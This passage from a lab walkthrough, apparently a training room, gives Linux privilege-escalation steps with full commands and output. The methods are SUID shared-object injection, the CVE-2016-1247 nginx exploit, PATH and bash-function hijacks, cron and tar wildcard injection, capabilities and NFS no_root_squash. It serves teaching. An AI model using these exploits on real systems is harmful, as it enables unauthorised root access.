open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
~~~

**Exploitation**

Linux VM

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

8. Save the file as `libcalc.c`
9. In command prompt type: `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`

~~~
TCM@debian:~/.config$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
TCM@debian:~/.config$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~


# [Task 12] Privilege Escalation - SUID (Symlinks)

**Detection**

Linux VM

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is below `1.6.2-5+deb8u3`.

~~~
TCM@debian:~$ dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
~~~

**Exploitation**

Linux VM – Terminal 1

1. For this exploit, it is required that the user be `www-data`. To simulate this escalate to root by typing: `su root`
2. The root password is `password123`
3. Once escalated to `root`, in command prompt type: `su -l www-data`
4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

~~~
TCM@debian:~$ su root
Password: 
root@debian:/home/user# su -l www-data
www-data@debian:~$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) 
nginxed-root.sh (ver. 1.0)

Discovered and coded by: 

Dawid Golunski 
https://legalhackers.com 

[+] Starting the exploit as: 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 926536 Aug 25 03:05 /tmp/nginxrootsh

[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: 
lrwxrwxrwx 1 www-data www-data 18 Aug 25 03:05 /var/log/nginx/error.log -> /etc/ld.so.preload

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
~~~

Linux VM – Terminal 2

1. Once logged in, type: `su root`
2. The root password is `password123`
3. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Switch back to the previous terminal.

~~~
TCM@debian:~$ su root
Password: 
root@debian:/home/user# invoke-rc.d nginx rotate >/dev/null 2>&1
~~~

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: `id`

~~~
[REDACTED]

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: 
-rw-r--r-- 1 www-data root 19 Aug 25 03:06 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 926536 Aug 25 03:05 /tmp/nginxrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 926536 Aug 25 03:05 /tmp/nginxrootsh

The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! 

nginxrootsh-4.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
nginxrootsh-4.1# 
~~~

## 12.1 - What CVE is being exploited in this task?

Answer: `CVE-2016-1247`

## 12.2 - What binary is SUID enabled and assists in the attack?

Answer: `sudo`


# [Task 13] Privilege Escalation - SUID (Environment Variables #1)

**Detection**

Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.

~~~
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18 13:02 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158725  912 -rwsrwxrwx   1 root     root       926536 Aug 25 03:05 /tmp/nginxrootsh
1158723  912 -rwsr-sr-x   1 root     staff      926536 Aug 25 03:00 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
~~~

3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the output, notice the functions used by the binary.

~~~
TCM@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
~~~

**Exploitation**

Linux VM

1. In command prompt type: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
2. In command prompt type: `gcc /tmp/service.c -o /tmp/service`
3. In command prompt type: `export PATH=/tmp:$PATH`
4. In command prompt type: `/usr/local/bin/suid-env`
5. In command prompt type: `id`

~~~
TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
TCM@debian:~$ gcc /tmp/service.c -o /tmp/service
TCM@debian:~$ export PATH=/tmp:$PATH
TCM@debian:~$ /usr/local/bin/suid-env
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~

## 13.1 - What is the last line of the "strings /usr/local/bin/suid-env" output?

Answer: `service apache2 start`


# [Task 14] Privilege Escalation - SUID (Environment Variables #2)

**Detection**

Linux VM

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.

~~~
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18 13:02 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158725  912 -rwsrwxrwx   1 root     root       926536 Aug 25 03:05 /tmp/nginxrootsh
1158723  912 -rwsr-sr-x   1 root     staff      926536 Aug 25 03:00 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
~~~

3. In command prompt type: `strings /usr/local/bin/suid-env2`
4. From the output, notice the functions used by the binary.

~~~
TCM@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
~~~

**Exploitation Method #1**

Linux VM

1. In command prompt type: `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
2. In command prompt type: `export -f /usr/sbin/service`
3. In command prompt type: `/usr/local/bin/suid-env2`

~~~
TCM@debian:~$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
TCM@debian:~$ export -f /usr/sbin/service
TCM@debian:~$ /usr/local/bin/suid-env2
bash-4.1# id
uid=0(root) gid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~

**Exploitation Method #2**

Linux VM

1. In command prompt type: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

~~~
TCM@debian:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
cp: cannot create regular file `/tmp/bash': Permission denied
/usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1479) already running
.
cp: cannot create regular file `/tmp/bash': Permission denied
set +x
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~

## 14.1 - What is the last line of the "strings /usr/local/bin/suid-env2" output?

Answer: `/usr/sbin/service apache2 start`


# [Task 15] Privilege Escalation - Capabilities

**Detection**

Linux VM

1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, notice the value of the `cap_setuid` capability.

~~~
TCM@debian:~$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
~~~

**Exploitation**

Linux VM

1. In command prompt type: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Enjoy root!

~~~
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~


# [Task 16] Privilege Escalation - Cron (Path)

**Detection**

Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the `PATH` variable.

~~~
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
~~~

**Exploitation**

Linux VM

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
2. In command prompt type: `chmod +x /home/user/overwrite.sh`

~~~
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
TCM@debian:~$ chmod +x /home/user/overwrite.sh
~~~

3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: `/tmp/bash -p`
5. In command prompt type: `id`

~~~
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~


# [Task 17] Privilege Escalation - Cron (Wildcards)

**Detection**

Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script `/usr/local/bin/compress.sh`

~~~
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
~~~

3. In command prompt type: `cat /usr/local/bin/compress.sh`
4. From the output, notice the wildcard (`*`) used by `tar`.

~~~
TCM@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
~~~

**Exploitation**

Linux VM

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`

~~~
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
~~~

4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: `/tmp/bash -p`
6. In command prompt type: `id`

~~~
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~


# [Task 18] Privilege Escalation - Cron (File Overwrite)

**﻿Detection**

Linux VM

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script `overwrite.sh`

~~~
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
~~~

3. In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
4. From the output, notice the file permissions.

~~~
TCM@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
~~~

**Exploitation**

Linux VM

1. In command prompt type: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`

~~~
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
~~~

2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`
4. In command prompt type: `id`

~~~
TCM@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~


# [Task 19] Privilege Escalation - NFS Root Squashing

**Detection**

Linux VM

1. In command line type: `cat /etc/exports`
2. From the output, notice that `no_root_squash` option is defined for the `/tmp` export.

~~~
TCM@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
~~~

**Exploitation**

Attacker VM

1. Open command prompt and type: `showmount -e 10.10.199.48`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=2 10.10.199.48:/tmp /tmp/1`.
4. In command prompt type: `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
5. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
6. In command prompt type: `chmod +s /tmp/1/x`

~~~
root@kali:/data/vpn# showmount -e 10.10.197.65
Export list for 10.10.197.65:
/tmp *
root@kali:/data/vpn# mkdir /tmp/1
root@kali:/data/vpn# mount -o rw,vers=2 10.10.197.65:/tmp /tmp/1
root@kali:/data/vpn# echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
root@kali:/data/vpn# gcc /tmp/1/x.c -o /tmp/1/x
/tmp/1/x.c: In function ‘main’:
/tmp/1/x.c:1:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
      |              ^~~~~~
/tmp/1/x.c:1:25: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
      |                         ^~~~~~
/tmp/1/x.c:1:36: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    1 | int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
      |                                    ^~~~~~
root@kali:/data/vpn# chmod +s /tmp/1/x
~~~

Linux VM

1. In command prompt type: `/tmp/x`
2. In command prompt type: `id`

~~~
TCM@debian:/tmp$ /tmp/x
root@debian:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
~~~
